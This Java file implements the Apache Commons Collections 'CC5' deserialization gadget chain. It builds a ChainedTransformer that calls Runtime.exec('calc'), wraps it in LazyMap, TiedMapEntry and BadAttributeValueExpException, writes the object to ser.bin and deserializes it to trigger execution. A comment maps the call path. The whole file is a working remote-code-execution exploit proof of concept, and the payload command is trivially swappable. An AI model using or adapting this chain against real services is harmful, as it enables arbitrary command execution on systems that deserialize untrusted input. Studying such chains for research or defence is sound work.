package CC5;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections4.map.AbstractMapDecorator;
import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.AbstractMap;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

/*
BadAttributeValueExpException#readObject() -> TiedMapEntry#toString() -> TiedMapEntry#getValue() ->
LazyMap#get() -> ChainedTransformer#transform() -> ConstantTransformer#transform()
-> InvokerTransformer#transform
 */

public class CC5 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class }, new Object[]{"getRuntime" , null}),
                new InvokerTransformer("invoke" , new Class[]{Object.class, Object[].class} , new Object[]{null, null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };

        ChainedTransformer chainedTransformer = new  ChainedTransformer(transformers);

        HashMap<Object,Object> map = new HashMap<>();
        Map lazyMap =  LazyMap.decorate(map, chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "aaa");

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(new ConstantTransformer(1));
        setValue("val",badAttributeValueExpException,  tiedMapEntry);
        //setFieldValue(tiedMapEntry,"map",lazyMap);
        serialize(badAttributeValueExpException);
        unserialize("ser.bin");

    }
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static void setValue(String name, Object target, Object value) {
        try {
            Field field = target.getClass().getDeclaredField(name);
            field.setAccessible(true);
            field.set(target, value);
        } catch (Exception ignore) {
        }
    }

    public  static  void  serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public  static  Object  unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
